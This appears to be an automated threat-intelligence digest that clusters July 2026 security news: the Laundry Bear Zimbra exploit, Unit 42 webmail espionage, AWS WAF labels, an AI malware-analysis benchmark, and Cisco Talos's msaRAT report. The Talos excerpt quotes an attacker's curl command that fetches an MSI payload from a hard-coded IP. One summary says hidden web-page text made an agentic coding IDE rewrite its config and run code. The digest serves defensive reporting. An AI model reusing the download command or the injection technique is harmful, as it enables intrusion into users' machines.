blog post , cybersecurity firm Seqrite reported that Russian threat actors had exploited CVE-2025-66376 in the compromise of a Ukrainian government agency. At the time, Seqrite attributed the activity, which it called "Operation GhostMail," to APT28, also known as Fancy Bear . The following day, the US Cybersecurity and Infrastructure Security Agency (CISA) added the high-severity vulnerability to its Known Exploited Vulnerabilities (KEV) catalog on March 18. Mitre also gave the vulnerability a 7.2 CVSS score. However, intelligence and cybersecurity agencies from 15 different countries revealed the exploitation activity was far more extensive and dated back to at least July 2025. They also tied the phishing campaign to a different Russian "Bear." Related: Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain Laundry Bear's 'Half-Click' Zimbra Exploit According to the joint advisory, the Netherlands General Intelligence and Security Service (AIVD) first identified Laundry Bear in May as a new Russian state-sponsored APT adjacent to other more well-known groups. Laundry Bear, the authoring agencies said, had previously relied on unsophisticated tactics such as password spraying and conventional phishing attacks until last year, when actors began using a "novel exploit" for CVE-2025-66376 that no longer required targeted victims to click on a link or open a malicious email attachment. In a blog post on Thursday, Proofpoint, which contributed to the government investigations into Laundry Bear, explained that the Zimbra vulnerability allowed the threat actors to craft "half-click" phishing emails that only nee
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Russian Hackers Exploit Zimbra Zero-Day Against US, Ukraine Targets
  - Published: 2026-07-23T21:23:18+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets
  - Summary: A state-sponsored threat group, dubbed "Laundry Bear," sends "half-click" phishing emails that require a victim only to open or preview the message.

### Cluster 8013169017 — score 11

- Title: Risky Bulletin: Hacker wipes Romania's entire land registry database
- Source: Risky Business News (practitioner_analysis)
- Published: 2026-07-20T05:22:45+00:00
- Link: https://risky.biz/RBNEWS589/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
A hacker wipes Romania’s entire land registry database, Magnet Forensics sues a former employee for leaking an iPhone exploit, an autonomous AI agent hacked Hugging Face, and an unauthenticated remote code execution bug was finally found in WordPress.
```

#### Full body

```
Risky Bulletin Podcast July 20, 2026 Risky Bulletin: Hacker wipes Romania's entire land registry database Presented by Catalin Cimpanu News Editor Claire Aird Newsreader A hacker wipes Romaniaâs entire land registry database, Magnet Forensics sues a former employee for leaking an iPhone exploit, an autonomous AI agent hacked Hugging Face, and an unauthenticated remote code execution bug was finally found in WordPress. Your browser does not support the audio element. Risky Bulletin: Hacker wipes Romania's entire land registry database â¶ 0:00 / 9:03 Subscribe Brought to you by Thinkst Know. When it Matters! Show notes Risky Bulletin: Hacker wipes Romania's entire land registry database
```

#### Corroborating sources (1)

- **Risky Business News** (practitioner_analysis)
  - Title: Risky Bulletin: Hacker wipes Romania's entire land registry database
  - Published: 2026-07-20T05:22:45+00:00
  - Link: https://risky.biz/RBNEWS589/
  - Summary: A hacker wipes Romania’s entire land registry database, Magnet Forensics sues a former employee for leaking an iPhone exploit, an autonomous AI agent hacked Hugging Face, and an unauthenticated remote code execution bug was finally found in WordPress.

### Cluster 8cd8d46bd5 — score 11

- Title: Do more with AWS WAF labels using dynamic label interpolation
- Source: AWS Security Blog (cloud_identity_infrastructure)
- Published: 2026-07-21T17:03:16+00:00
- Link: https://aws.amazon.com/blogs/security/do-more-with-aws-waf-labels-using-dynamic-label-interpolation/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 3
- Strong signals: AWS

#### Cluster taxonomy (union across members)
- affected_products: AWS, Azure, Google Cloud
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- affected_products: AWS
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
AWS WAF classifies web traffic by attaching metadata to each request it evaluates. Managed rule groups such as AWS WAF Bot Control and AWS WAF Fraud Control account takeover prevention (ATP) attach labels that describe what they found. A label can record that a request came from a known bot category or that it matched […]
```

#### Full body

```
AWS Security Blog Do more with AWS WAF labels using dynamic label interpolation AWS WAF classifies web traffic by attaching metadata to each request it evaluates. Managed rule groups such as AWS WAF Bot Control and AWS WAF Fraud Control account takeover prevention (ATP) attach labels that describe what they found. A label can record that a request came from a known bot category or that it matched a credential-stuffing pattern. You can forward that metadata to your origin as request headers, which gives your backend visibility into the decisions AWS WAF made at the edge. You can also use labels to build tiered policies: a low-confidence bot signal might trigger a CAPTCHA challenge, whereas a high-confidence signal blocks the request outright. With the AWS WAF AI Activity Dashboard , launched February 24, 2026, Bot Control now identifies more than 650 bots and agents, including search engine crawlers, data collectors, AI assistants, and large language model (LLM) training crawlers, which is ever increasing over time. In an earlier post , we showed how to group Bot Control labels into confidence levels and use them to drive adaptive user experiences in your application. That approach works well when you can list the labels you care about. After the catalog grows past what you can reasonably enumerate, writing a rule for each label becomes a maintenance burden and consumes rule capacity you’d rather spend elsewhere. With dynamic label interpolation, you can reference labels by namespace instead of by individual name, so a single rule resolves to whichever labels matched during evaluation with no requirement to enumerate each one. You write a ${namespace:} clause in a header value or custom response body, and AWS WAF substitutes the matched values at evaluation time. The feature also gives you synthetic labels you can embed directly in responses, including the client IP address, request JA3 and JA4 fingerprints, and WAF request ID. The rest of this post explains how interpolation resolves labels by referencing four scenarios: forwarding classification data to your application, building custom block and challenge pages, redirecting traffic to a verification step, and segmenting Amazon CloudFront caches by bot category. Interpolation syntax and behavior Dynamic label interpolation uses a ${namespace:} syntax that resolves label values at evaluation time. You can use it in three places: Where What it does Syntax Custom request headers Inserts resolved label values into headers that AWS WAF forwards to your origin. For example, set X-Bot-Category to so your application receives the matched bot category directly. in the header value field Custom response bodies Embeds label values and synthetic labels (such as client IP or request ID) in block pages, challenge pages, and other custom responses. in the response body Content field Custom response headers Insert label values into response headers (for example, Location for redirects). in the response header Value field In each case, AWS WAF reads the labels attached to the request and substitutes the resolved values into the string you provide. The interpolation syntax Include a ${namespace:} clause anywhere you would normally put a header value or custom response body. The trailing colon is what signals interpolation, telling AWS WAF to resolve every label in that namespace rather than match a single named label. AWS WAF evaluates each clause against the labels on the request and follows three rules: Single match – The clause resolves to the label’s terminal value. If the request carries awswaf:managed:aws:bot-control:bot:category:scraping , then ${awswaf:managed:aws:bot-control:bot:category:} resolves to scraping . Multiple matches – AWS WAF strips the namespace prefix and returns the values as a comma-separated list, such as scraping , advertising . No match – The clause resolves to an empty string. This is backward compatible. AWS WAF only interpolates a value when it contains a ${...}
```

#### Corroborating sources (3)

- **AWS Security Blog** (cloud_identity_infrastructure)
  - Title: Do more with AWS WAF labels using dynamic label interpolation
  - Published: 2026-07-21T17:03:16+00:00
  - Link: https://aws.amazon.com/blogs/security/do-more-with-aws-waf-labels-using-dynamic-label-interpolation/
  - Summary: AWS WAF classifies web traffic by attaching metadata to each request it evaluates. Managed rule groups such as AWS WAF Bot Control and AWS WAF Fraud Control account takeover prevention (ATP) attach labels that describe what they found. A label can record that a request came from a known bot category or that it matched […]
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: AWS Kiro Flaw Let a Poisoned Web Page Rewrite Its Config and Run Code
  - Published: 2026-07-21T16:06:12+00:00
  - Link: https://thehackernews.com/2026/07/aws-kiro-flaw-let-poisoned-web-page.html
  - Summary: Hidden text on a web page was enough to make Kiro, AWS's agentic coding IDE, rewrite its own configuration file and run an attacker's code on a developer's machine, with no approval step able to stop it. Intezer, in research with Kodem Security, found that a request as ordinary as asking Kiro to summarize a page could end in remote code execution. AWS has patched the issue and says it is
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - Title: I want to transition from an AppSec role to Cloud Security. How feasible is this and how should I study?
  - Published: 2026-07-25T06:56:20+00:00
  - Link: https://www.reddit.com/r/cybersecurity/comments/1v60y57/i_want_to_transition_from_an_appsec_role_to_cloud/
  - Summary: I just want to state, when I get assigned to projects or help builders secure their apps, of course this includes at least some exposure to cloud security because all apps live in the cloud. A lot of my time goes to threat modeling, secure code review, and helping apps find threats in their design. That said, I feel like my day-to-day is heavily weighted toward application-layer concerns, things like design flaws, api security, a lot of code review, etc. For those of you who've made a similar transition (or work in cloud security and hire from AppSec backgrounds): How transferable are AppSec skills in practice? I'd assume threat modeling and understanding attacker mindset translate well, but what gaps should I expect? What should I focus on studying? I'm thinking AWS/Azure/GCP certifications, but I'm not sure which ones actually matter vs. just being resume flair Any resources, labs, or projects you'd recommend for building hands-on cloud security experience outside of work? Appreciate

### Cluster 1ff0bf04bf — score 10

- Title: Russian Global Webmail Espionage
- Source: Unit 42 (threat_research_primary)
- Published: 2026-07-23T14:10:53+00:00
- Link: https://unit42.paloaltonetworks.com/russian-webmail-espionage/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng
- affected_industries: financial_services, government
- affected_products: Palo Alto Networks
- cve_ids: CVE-2025-66376
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng, apt_espionage
- affected_industries: financial_services, government
- affected_products: Palo Alto Networks
- cve_ids: CVE-2025-66376
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Unit 42 details a Russian cyberespionage campaign targeting Zimbra webmail servers using JavaScript injection to steal credentials. The post Russian Global Webmail Espionage appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Threat Research Cybercrime Cybercrime Russian Global Webmail Espionage 3 min read Related Products Advanced DNS Security Advanced URL Filtering Cloud-Delivered Security Services Cortex Unit 42 Incident Response By: Unit 42 Published: July 23, 2026 Categories: Cybercrime Threat Research Tags: CL-STA-1114 JavaScript Javascript injection Nation-state Obfuscation Phishing Zimbra webmail Share Executive Summary Unit 42 has observed a persistent cyberespionage campaign we track as CL-STA-1114. This activity cluster overlaps with activity from a Russian threat actor tracked by other vendors as Void Blizzard and LAUNDRY BEAR. The attackers behind this campaign targeted Zimbra webmail in organizations in the following sectors: Governments Defense Transportation Financial organizations across the following regions: NATO member states Ukraine Commonwealth of Independent States (CIS) countries Africa Unique to this campaign, the group leveraged zero-click phishing emails that exploit a vulnerability in the Zimbra Collaboration Suite (ZCS) webmail platform (CVE-2025-66376). The exploit automatically injects a malicious JavaScript payload without requiring recipient interaction. Once executed, the payload exfiltrates sensitive user data, including login credentials, email archives, and search histories. Threat actors continue to actively target unpatched ZCS instances using CVE-2025-66376. Palo Alto Networks customers are better protected from the threats discussed above through the following products: Cortex Advanced Email Security Advanced URL Filtering and Advanced DNS Security If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics Cyberespionage , Phishing , Data Exfiltration Technical Analysis The attackers behind CL-STA-1114 have been active since at least 2024 , and this campaign targeting Zimbra servers started in July 2025. Initial access starts with a phishing email that contains either an HTML attachment or embedded HTML in the message text. This lure is designed to catch recipients' attention with news headlines. Figure 1 shows an example of the lure used and a snippet of the underlying HTML code. Figure 1. Example lure and a snippet of its underlying HTML content. The HTML text contains an obfuscated division with a Base64-encoded script (highlighted in red in Figure 1). The obfuscated section creates an invisible Scalable Vector Graphics (SVG) element that, upon loading, decodes the Base64-encoded script into a JavaScript payload that it injects into the victim’s browser. When executed, this JavaScript exfiltrates the victim’s Zimbra webmail data to a hard-coded command and control (C2) server. Exfiltrated data includes: CSRF tokens Email address and password Two-factor authentication (2FA) scratch codes System and environment details The victim’s last 90 days of email and search history Over the course of this campaign, we observed minimal changes to the JavaScript payload. Figure 2 illustrates the attack chain. Figure 2. The attack chain. Since we began tracking this campaign, there have been at least nine IP addresses and nine domains for the C2 servers. These servers were active for an average of 35.4 days. See the Indicators of Compromise (IoC) section for a list of the IP addresses and domains used in CL-STA-1114 activity. Conclusion This campaign activity in CL-STA-1114 illustrates the persistent and evolving threat of state-sponsored cyberespionage. The attacker behind this activity targets widely used mail platforms like Zimbra, posing a risk to critical industries globally. This research highlights the need for vigilance, proactive patching and advanced threat detection to protect organizations. Network administrators, defenders and security researchers should patch vulnerable systems and use the IoCs below to investigate and strengthen defenses against CL-STA-1114 and similar activity. Palo Alto Networks custom
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: Russian Global Webmail Espionage
  - Published: 2026-07-23T14:10:53+00:00
  - Link: https://unit42.paloaltonetworks.com/russian-webmail-espionage/
  - Summary: Unit 42 details a Russian cyberespionage campaign targeting Zimbra webmail servers using JavaScript injection to steal credentials. The post Russian Global Webmail Espionage appeared first on Unit 42 .

### Cluster de2a131113 — score 10

- Title: Real world incident response: Microsoft and AXA XL strengthen cyber resilience
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-07-22T16:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/07/22/real-world-incident-response-microsoft-and-axa-xl-strengthen-cyber-resilience/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_industries: legal_professional
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_industries: legal_professional
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Our collaboration with AXA XL brings Microsoft Incident Response services directly to cyber insurance policyholders, helping organizations coordinate technical, business, and insurance decisions. The post Real world incident response: Microsoft and AXA XL strengthen cyber resilience appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Cyber incidents don’t wait—and effective response can’t either. In the age of AI where cyber incidents unfold at machine speed, having the right partnerships in place becomes paramount. While AI is expanding what’s possible, navigating this transformation can be challenging to do alone. That’s why our collaboration with AXA XL is so important—bringing Microsoft Defender Experts Cybersecurity Incident Response services directly to cyber insurance policyholders at the moment it matters most, helping organizations coordinate technical, business, and insurance decisions in parallel rather than in sequence. Get started with Microsoft Defender Experts Cybersecurity Incident Response This collaboration reflects Microsoft’s continued investment in building an incident response model designed for real-world conditions, where speed, trust, and alignment matter as much as technology. In a live incident, security, executive, legal, and insurance teams are all acting at once. Without pre-established coordination, those parallel efforts can slow containment and increase risk. Our approach to incident response—and our work with AXA XL —starts by aligning those paths before a crisis begins. For example, during a ransomware incident, security teams may be actively containing lateral movement while leadership evaluates operational impact, legal teams assess disclosure requirements, and insurers determine coverage pathways—all within the same window of time. When those decisions aren’t aligned, response slows and risk compounds. Decades of supporting customers through high-stakes cyber incidents have reinforced a clear truth: effective incident response extends beyond technical execution. It requires coordination across teams and partners before the crisis hits. That experience continues to shape how we design Defender Experts Cybersecurity Incident Response—and how we work with partners like AXA XL. Incident response must extend beyond technology As a global insurance provider, AXA XL plays a critical role in helping organizations navigate cyber risk and response. Through this collaboration, AXA XL policyholders gain coordinated access to Microsoft’s dedicated incident response teams—combining threat containment, restoration, and recovery with insurance, legal, and regulatory workflows. By aligning AXA XL’s cyber insurance capabilities with Defender Experts Cybersecurity Incident Response, organizations benefit from a more integrated response model while gaining access to incident response teams informed by Microsoft Threat Intelligence and two decades of experience responding to some of the world’s most complex and consequential cyber incidents. Previously, organizations often brought incident responders and insurers together in the middle of a crisis. With this collaboration, that relationship is already in place, reducing friction, delays, and uncertainty when time is most critical. AXA XL policyholders and Microsoft customers can now bring Defender Experts Cybersecurity Incident Response to the table the moment it matters—creating a clearer, more predictable path from detection to recovery. The outcome is not simply faster response, but confidence: knowing who to call, how response engages, and how recovery is operationalized before the next decision becomes urgent. The threat of a cybersecurity incident has long been ‘not if, but when,’ and in the wake of AI, the ‘when’ may quickly become ‘how often.’ The risks organizations are tasked with preventing and overcoming relative to cybersecurity and data privacy are growing exponentially. Partnering with experts can make all the difference where resilience in the face of adversity may be your only saving grace. AXA XL’s strategic partnerships with cyber incident response providers underscore our commitment to expertise, preparedness, and resilience. By drawing on a deep knowledge of internal expertise and external cyber specialists, we empower our insureds to re
```

#### Corroborating sources (1)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Real world incident response: Microsoft and AXA XL strengthen cyber resilience
  - Published: 2026-07-22T16:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/07/22/real-world-incident-response-microsoft-and-axa-xl-strengthen-cyber-resilience/
  - Summary: Our collaboration with AXA XL brings Microsoft Incident Response services directly to cyber insurance policyholders, helping organizations coordinate technical, business, and insurance decisions. The post Real world incident response: Microsoft and AXA XL strengthen cyber resilience appeared first on Microsoft Security Blog .

### Cluster 7200b1bf11 — score 10

- Title: Sol Searching | Can Frontier Models Tackle Autonomous Long-Horizon Malware Analysis?
- Source: SentinelOne Labs (threat_research_primary)
- Published: 2026-07-22T16:55:29+00:00
- Link: https://www.sentinelone.com/labs/frontier-models-tackle-autonomous-long-horizon-malware-analysis/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: government
- affected_products: Linux kernel, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: government
- affected_products: Linux kernel, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
A real-world benchmark tests whether powerful AI models can keep an investigation trustworthy when new evidence invalidates their conclusions.
```

#### Full body

```
AI Research Sol Searching | Can Frontier Models Tackle Autonomous Long-Horizon Malware Analysis? Juan Andrés Guerrero-Saade & Gabriel Bernadett-Shapiro / July 22, 2026 Executive Summary SentinelLABS developed a multi-stage reverse-engineering benchmark for the latest generation of frontier models by recreating our recent investigation of fast16 , a unique 2005 sabotage implant. Most AI benchmarks test bounded tasks. This benchmark tests whether a model can keep a malware investigation trustworthy as new evidence repeatedly invalidates its earlier conclusions. OpenAI’s GPT-5.6 Sol was the only publicly available model to complete the full eight-stage investigation, giving concrete shape to what ‘Frontier-class’ capabilities offer analysts. GPT-5.5, GLM-5.2, and the Opus 4.x family produced capable local analysis but could not carry it through the gradient. What distinguished the completed runs was project-scale recovery: withdrawing contradicted conclusions, repairing technical artifacts, and updating dependent reporting without losing the investigation. Senior reverse engineers remain essential. Even the strongest runs made semantic errors, accepted weak quality controls, and claimed readiness prematurely. We assess the best current use as supervised investigative agency, with human analysts defining objectives, exposing blind spots, and retaining final publication authority. Beyond Vulnerability Discovery Since ChatGPT arrived in late 2022, we have been bullish on what large language models could do for reverse engineering and malware analysis. The early models were useful for teaching but too rudimentary for production work; that changed with the advent of reasoning models. OpenAI’s o1-preview, in September 2024, was the first to show the kind of sustained problem-solving the work demands, and within months Sean Heelan had used o3 to find a net-new vulnerability in the Linux kernel . In cybersecurity, though, our understanding of what these models can do remains stovepiped to vulnerability discovery. The frontier labs took on vulnerability discovery deliberately, because that competency keeps agentic code generation from quietly shipping vulnerable code at scale. OpenAI built Aardvark, since folded into Codex; Google DeepMind announced Big Sleep, available internally to its Project Zero researchers; and Anthropic followed with selective access to Mythos Preview. Concerns that these capabilities could be misused have led the labs to stricter guardrails and ‘know your customer’ style controls that limit access to specific capabilities, or to entire model variants. OpenAI’s Daybreak initiative and its Trusted Access Program opened a dedicated variant, GPT-5.*-cyber-preview, with guardrails relaxed for cybersecurity use cases, while Anthropic’s Glasswing initiative and its Cyber Verification Program provided early access to Mythos Preview and the promise of lesser guardrails respectively. For a short period in mid-June 2026 access to the highest-end flagship models from both providers required some form of U.S. government clearance. At the time of writing, GPT 5.6 Sol is widely available, while Mythos 5 still requires clearance and access as a Glasswing partner. The existence of this new class of models left us with an unusual task: benchmarking what these models can actually do on the work defenders care about, and assessing whether they live up to the surrounding hype. If they do, we have to reckon with what that means for malware analysis and reverse engineering, disciplines that until now have been limited mostly by how little expertise exists relative to the collective need. A Benchmark Built From a Real Investigation We recently published our research on fast16 , a 2005 Windows toolkit built to sabotage high-precision solvers used to model nuclear-weapons behavior. The sample provided an ideal test case because its layered design punishes shallow analysis. On the surface, svcmgmt.exe appears to be a Windows service implant
```

#### Corroborating sources (1)

- **SentinelOne Labs** (threat_research_primary)
  - Title: Sol Searching | Can Frontier Models Tackle Autonomous Long-Horizon Malware Analysis?
  - Published: 2026-07-22T16:55:29+00:00
  - Link: https://www.sentinelone.com/labs/frontier-models-tackle-autonomous-long-horizon-malware-analysis/
  - Summary: A real-world benchmark tests whether powerful AI models can keep an investigation trustworthy when new evidence invalidates their conclusions.

### Cluster a1940e8772 — score 10

- Title: Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-07-23T10:00:38+00:00
- Link: https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, phishing_social_eng, ransomware_extortion
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, data_breach
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
The Chaos ransomware group uses new malware "msaRAT" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.
```

#### Full body

```
Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel By Jordyn Dunk , Michael Szeliga , Takahiro Takeda Thursday, July 23, 2026 06:00 ransomware RAT Cisco Talos has discovered a new Rust-based remote access trojan (RAT) we call “msaRAT” attributed to the Chaos ransomware group. The name is derived from the binding names found in the binary: “msaOpen,” “msaClose,” “msaError,” and “msaMessage”. msaRAT is implemented using the Tokio asynchronous runtime, with primary capabilities of browser-leveraged remote code execution and covert tunneling to establish command-and-control (C2) communications. This RAT never touches the network directly — it controls its C2 communication channel exclusively through Chrome DevTools Protocol (CDP), a browser debugging API. The binary contains a Cloudflare Workers endpoint, but it never makes HTTP connections to that domain itself; it offloads that work entirely to the browser. msaRAT manipulates the browser via CDP, performs signaling (SDP Offer/Answer exchange) with Cloudflare Workers, and establishes a WebRTC DataChannel between the browser and the C2 server using Twilio TURN (Traversal Using Relays around NAT) as a relay. Overview of Chaos ransomware Chaos is a ransomware-as-a-service (RaaS) group whose activity was first confirmed in February 2025. Although the number of listings on their data leak site remains relatively low, the group consistently targets large organizations and employs double extortion tactics. For initial access, they rely on spam emails and voice-based social engineering, commonly known as vishing. Once inside a network, their traditional post-compromise methodology involves abusing remote monitoring and management (RMM) tools to establish persistent access, while leveraging legitimate file-sharing software to exfiltrate data. For a detailed breakdown of their tactics, techniques, and procedures (TTPs), please refer to our previous blog. Figure 1. Chaos ransomware leak site. Infection chain Talos has identified a new Rust-based RAT used by the Chaos ransomware group, which we have named msaRAT. The name is derived from the binding names found in the binary (“msaOpen,” “msaClose,” “msaError,” “msaMessage”), as detailed in a later section. Figure 2 illustrates the end-to-end infection chain, from initial compromise through to the establishment of C2 communications via this RAT. Figure 2. Infection chain. After gaining access to a victim machine but prior to executing the ransomware, the attacker runs the following curl command to download an MSI file named “update_ms.msi” from an attacker-controlled server to the ProgramData directory on the victim machine, then executes it. Although port 443 is specified, the communication occurs over plain HTTP. In environments where firewall rules permit traffic based solely on port number without protocol inspection, this traffic will pass through undetected. curl.exe http://172.86.126.18:443/update_ms.msi -o C:\programdata\update_ms.msi The property information of this installer, which extracts the DLL file containing the RAT payload, contains details configured to impersonate a Windows update. Figure 3. Properties of “update_ms.msi” When this MSI file is executed, the custom action CA_Run_EA2AEBC3 is triggered upon completion of InstallFinalize . This custom action loads lib.dll, embedded in the MSI file's Binary table as Bin_lib_EA2AEBC3 , directly into memory. Figure 4. Structure of the MSI file. lib.dll (msaRAT) msaRAT is written in Rust and implemented using the asynchronous runtime Tokio. Its primary capabilities include browser-leveraged reverse shell and covert tunneling to establish communications with a C2 server. The export table of “lib.dll” exposes a function named RUN , which is designed to be called by the installer described above. Based on the actual logs, after downloading this malware, we have confirmed the existence of a ransom note. Tokio runtime initialization Tokio is a runtime for exec
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel
  - Published: 2026-07-23T10:00:38+00:00
  - Link: https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
  - Summary: The Chaos ransomware group uses new malware "msaRAT" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.

### Cluster b4009da441 — score 10

- Title: Ransomware is the Scoreboard
- Source: Recorded Future (threat_research_primary)
- Published: 2026-07-24T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/ransomware-is-the-scoreboard
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion
- affected_industries: government, legal_professional
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, apt_espionage
- affected_industries: government, legal_professional
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Ransomware is the scoreboard for defensive architecture. Learn why traditional security methods fail and how to use AI and threat intelligence to identify and remediate critical attack paths.
```

#### Full body

```
Ransomware is the Scoreboard Every Victim is a Verdict on Defensive Architecture 13,000. That’s the number of ransomware victims Recorded Future has observed over the past two years. Watching the near-real-time ransomware attacks on businesses, non-profits, and government agencies has left me, like many security professionals and board directors, pondering how and why cyber defense keeps losing this particular fight. Adversaries like Interlock and RansomHub have continued their successful march to riches over the past 18 months. The multi-billion-ruble question is, “How?” BloodHound and the defensive graph concept debuted over a decade ago and still maintain a vibrant open-source community. Continuous Threat Exposure Management (CTEM) (and attack path management) is an established cyber vendor category, yet ransomware crews are demonstrably eating many organizations’ lunch. Let’s explore the problems (which are relatively easy to enumerate) and a solution (harder): modeling defense as the graph attackers actually traverse, at the speed they traverse it, which, of course, involves intelligence. The Barometer Ransomware is a solid barometer of operational defensive success, specifically because, unlike espionage, it’s noisy, financially motivated, and opportunistic. Certainly, ransomware also benefits from an optimal ecosystem, including payment economics, cyber insurance playbooks, and jurisdictional safe havens, which help incentivize ransomware gangs to find the cheapest attack paths. Relatively inexperienced actors can pick up commodity tools and reach the crown jewels. That highly repeated Ransomware-as-a-Service (RaaS) dynamic is a verdict on the availability of attack paths, regardless of payment incentives. tkhlbp1eyn The prior two years of Recorded Future data revealed 834 unique ransomware families (or brands). The ransomware playbook is only becoming more effective over time, particularly as regional and industry-specific data privacy compliance regulations proliferate. The risk impact is now less about operational disruption, as offline backup resilience has increased, and more squarely focused on the legal or compliance failure of losing legislatively protected information. What’s in a Graph? It’s helpful to visualize an organization as an interconnected graph of nodes and edges, comprising hosts, configurations, credentials, and more. Adversaries attempt to traverse the graph and identify any available weaknesses that, when combined (via attack paths), lead to risk impacts. If operational defense shifts focus from compliance-driven lists and categories, and we model the environment as a graph, will we better understand and remediate attack paths to prevent ransomware? Only if we can match adversarial velocity. hiccbodazp For an enterprise, the graph is combinatorially large, changes hourly, and humans can’t maintain or query it at the tempo at which attackers traverse it. Graphs provide the structure. Threat intelligence supplies the edge weights, and AI agents deliver the speed. In practice, that means agents recompute attack paths whenever the graph changes, test whether a newly reported adversary technique actually traverses your environment, and push the choke point to the top of the remediation queue, continuously, without waiting on an analyst. Interlock ransomware is a good example of an attack path. Interlock uses multiple tactics to acquire unauthorized access. One of their favorites is ClickFix-style social engineering : a fake CAPTCHA convinces a user to paste a command into the Windows Run dialog or PowerShell, which executes malware that harvests credentials, and the group moves laterally from there. That initial access is CVE-free at the point of entry, and it doesn’t appear on any vulnerability list. The entire path is identity and configuration edges. A defender with a perfect, fully patched vuln list has zero visibility into the path Interlock actually takes. That’s one example of an attack path. I
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: Ransomware is the Scoreboard
  - Published: 2026-07-24T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/ransomware-is-the-scoreboard
  - Summary: Ransomware is the scoreboard for defensive architecture. Learn why traditional security methods fail and how to use AI and threat intelligence to identify and remediate critical attack paths.

### Cluster 9df0a945fb — score 10

- Title: TAG-195 Upgrades MaaS Ecosystem with Modular Tools
- Source: Recorded Future (threat_research_primary)
- Published: 2026-07-23T00:00:00+00:00
- Link: https://www.recordedfuture.com/research/tag-195-evolves-maas-ecosystem
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, web_shell_backdoor
- affected_industries: critical_infrastructure
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: credential_theft, web_shell_backdoor
- affected_industries: critical_infrastructure
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Insikt Group identifies four new TAG-195 malware families, revealing an architectural transition toward modular, operator-driven tooling in the MaaS ecosystem
```

#### Full body

```
